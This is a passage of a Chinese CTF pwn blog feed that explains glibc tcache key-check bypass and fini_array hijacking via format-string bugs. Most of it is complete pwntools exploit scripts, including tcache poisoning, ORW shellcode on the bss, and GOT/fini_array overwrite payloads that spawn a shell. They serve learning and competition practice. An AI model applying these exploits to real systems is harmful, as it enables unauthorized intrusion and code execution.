id="font-style-color-rgb-51-51-51-绕过分析-font"><font style="color:rgb(51, 51, 51);">绕过分析</font></h3><p><font style="color:rgb(51, 51, 51);">key校验机制的关键点有2个：校验key值，是否等于tcache结构体地址</font></p><ul><li><font style="color:rgb(51, 51, 51);">不等于的话，就直接正常释放</font></li><li><font style="color:rgb(51, 51, 51);">等于的话，</font><strong><font style="color:rgb(51, 51, 51);">遍历对应大小的链表</font></strong><font style="color:rgb(51, 51, 51);">检查是否存在Double-Free</font></li></ul><p><font style="color:rgb(51, 51, 51);">常规的绕过key机制的方式是修改key字段，常见通过Overflow或者UAF或者泄露来完成</font></p><p><font style="color:rgb(51, 51, 51);">heap_addr=key&lt;&lt;12</font></p><h3 id="font-style-color-rgb-51-51-51-绕过方法-font"><font style="color:rgb(51, 51, 51);">绕过方法</font></h3><h4 id="泄露">泄露</h4><p>当存在uaf的时候，我们可以直接泄露key，就可以绕过</p><p>修改fd位：xor_free_hook=free_hook^key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p>例题</p><p>flag被读入0x4060，并给出pie_base</p><p>add,edit,show,free四个功能函数</p><p>2.35版本，uaf</p><p>uaf泄露出key之后tcachebin attack 将flag堆块申请出来，show就可以得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410367915-aae1ee10-12f0-4e23-ae52-ecfdb3fe86ae.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410389619-0bc1b17a-3938-4338-a614-d6281c944a5b.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1a44</span></span><br><span class="line">li(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">flag=pie_base+<span class="number">0x4060</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;input size&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rl(<span class="string">&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="font-style-color-rgb-34-34-38-House-of-Karui-font"><font style="color:rgb(34, 34, 38);">House of Karui</font></h4><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/142422852">【我的 PWN 学习手札】House of Karui —— tcache key 绕过_tcache key怎么找-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">2.34的key异或绕过</summary>
    
    
    
    <category term="Chunk" scheme="https://www.thir0th.xyz/categories/Chunk/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>fini_array劫持</title>
    <link href="https://www.thir0th.xyz/posts/6db984ee.html"/>
    <id>https://www.thir0th.xyz/posts/6db984ee.html</id>
    <published>2025-04-19T16:18:35.000Z</published>
    <updated>2025-05-07T08:12:05.322Z</updated>
    
    <content type="html"><![CDATA[<h1>非栈上fmt劫持</h1><p><a href="https://www.cnblogs.com/seyedog/p/17891490.html">https://www.cnblogs.com/seyedog/p/17891490.html</a></p><h2 id="原理分析">原理分析</h2><p>程序执行流程图：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713479270-56b817f8-817e-4336-8cfc-fb463d07ff76.png" alt=""></p><p>函数最终exit退出时会调用fini_array函数，如果可以控制fini_array，就可以劫持程序流程</p><p>dl_fini函数</p><p>main-&gt;exit-&gt;<strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">__run_exit_handlers-&gt;dl_fini</font></strong></p><p><strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">dl_fini函数中会调用call rax</font></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713632424-eb86c69d-1e65-4f80-9900-29dcc570b6d2.png" alt=""></p><p>我们可以控制l_addr，浅紫色为残存下来的l_addr地址，我们可以利用fmt去修改这个数值,劫持程序返回到tar_addr</p><p>偏移计算：偏移=tar_addr-fini_arry_addr</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714211462-96e208c7-58cc-4585-b1d7-783926810183.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713703387-c634b302-5b6f-49d0-80a2-e0d1acf6cde7.png" alt=""></p><h2 id="例题">例题</h2><p>2023金盾杯的一道题</p><p>这里有close(1)，没办法输出，这样我们偏移就不好找，同时开启沙盒，只有一次非栈上fmt</p><p>思路：直接用到fini_array劫持，<font style="color:rgb(34, 34, 34);">通过修改dl_fini数组里的偏移值，使函数在退出时执行我们写在bss段上的shellcode</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726382942358-8ae4fc44-76b3-43d2-b127-440e1a7796b5.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713136255-e1963cea-ee23-4e3d-8647-cb61f1d88020.png" alt=""></p><p>我们可以将close(1) 修掉，nop掉</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714408563-9e64ff30-ca94-4dc3-8fea-82f55aa9114b.png" alt=""></p><p>完成：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714480116-3a82770d-a9df-4543-b4fa-23118d0347d2.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714489260-968affba-4ab2-4af7-95a2-c0f3e134fa7b.png" alt=""></p><p>保存</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714515960-fde24aba-0ecd-4a5a-82d2-8e6e2fdc83e2.png" alt=""></p><p>偏移计算</p><p>偏移=shellcode_addr-fini_addr</p><p><font style="color:rgb(34, 34, 34);">0x40406B - 0x403D98 = 723</font></p><p><font style="color:rgb(34, 34, 34);">修改的同时读入orw shellcode</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">bss=0x404060</span><br><span class="line">shellcode  =asm(shellcraft.open(&quot;/flag&quot;))</span><br><span class="line">shellcode +=asm(shellcraft.read(3,bss+0x50,0x100))</span><br><span class="line">shellcode +=asm(shellcraft.write(2,bss+0x50,0x100))</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Let&#x27;s start!&quot;)</span><br><span class="line">payload=b&#x27;%723c%30$hn&#x27;+p64(0x40406b+8)+pay</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><font style="color:rgb(34, 34, 34);"></font></p><h1>栈上fmt劫持</h1><p><font style="color:rgb(48, 49, 51);">fmt直接修改</font></p><p><font style="color:rgb(48, 49, 51);">[CISCN 2019西南]</font></p><p><font style="color:rgb(48, 49, 51);">给出system函数，但只有一次fmt，64字节，修改printf.got-system.plt,fini_array-main</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726716333395-b27c9ea5-5c4d-473e-8786-2edff5f8ded2.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.anna.nssctf.cn&#x27;,25279)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#gdb.attach(p,&#x27;b* 0x080485A8&#x27;)</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">printf=elf.got[&#x27;printf&#x27;]</span><br><span class="line">fini_array=0x0804979C</span><br><span class="line">system=0x080483D0</span><br><span class="line">main=0x08048534</span><br><span class="line">gdb.attach(p, &#x27;b *0x804859E&#x27;)</span><br><span class="line">pause()</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">payload =p32(fini_array+2)+p32(printf+2)+p32(printf)+p32(fini_array)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=&quot;%&quot;+str(0x0804-0x10)+&quot;c%4$hn&quot;   #0804</span><br><span class="line">payload+=&quot;%5$hn&quot;                         #0804</span><br><span class="line">payload+=&quot;%&quot;+str(0x83d0-0x0804)+&quot;c%6$hn&quot; #83d0</span><br><span class="line">payload+=&quot;%&quot;+str(0x8534-0x83d0)+&quot;c%7$hn&quot; #8534</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload+=b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line">rl(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)</span><br><span class="line">sl(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">fini_array劫持</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>魔法的gadget🪄</title>
    <link href="https://www.thir0th.xyz/posts/8541dcda.html"/>
    <id>https://www.thir0th.xyz/posts/8541dcda.html</id>
    <published>2025-04-19T16:17:35.000Z</published>
    <updated>2025-05-07T08:11:55.315Z</updated>
    
